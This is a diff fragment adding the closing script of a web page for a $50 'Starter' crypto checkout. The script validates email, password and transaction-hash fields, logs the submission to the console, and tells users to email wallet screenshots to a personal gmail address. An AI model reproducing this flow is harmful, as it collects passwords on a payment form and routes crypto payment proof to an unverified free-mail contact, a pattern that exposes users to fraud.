+        const email = document.getElementById("emailInput").value.trim();
+        const password = document.getElementById("passwordInput").value.trim();
+        const tx = document.getElementById("txInput").value.trim();
+        const note = document.getElementById("noteInput").value.trim();
+
+        if (!email || !password || !tx) {
+          statusText.textContent =
+            "Please fill in your email, password, and transaction link/hash.";
+          statusText.classList.add("warning");
+          return;
+        }
+
+        // Frontend-only demo: log data. In real life, send to backend.
+        console.log("Starter checkout submitted:", {
+          plan: "Starter",
+          amountUSD: 50,
+          coin: currentCoin,
+          email,
+          tx,
+          note
+        });
+
+        statusText.textContent =
+          "Thanks! Your details were submitted. Please also email your wallet screenshot and this TX link to coinexa.ai@gmail.com for fastest activation.";
+        statusText.classList.remove("warning");
+        statusText.classList.add("success");
+
+        // Optionally, you can disable the button after submit
+        submitBtn.disabled = true;
+        submitBtn.style.opacity = 0.75;
+        submitBtn.style.cursor = "default";
+      });
+    })();
+  </script>
+
+
+</body></html>
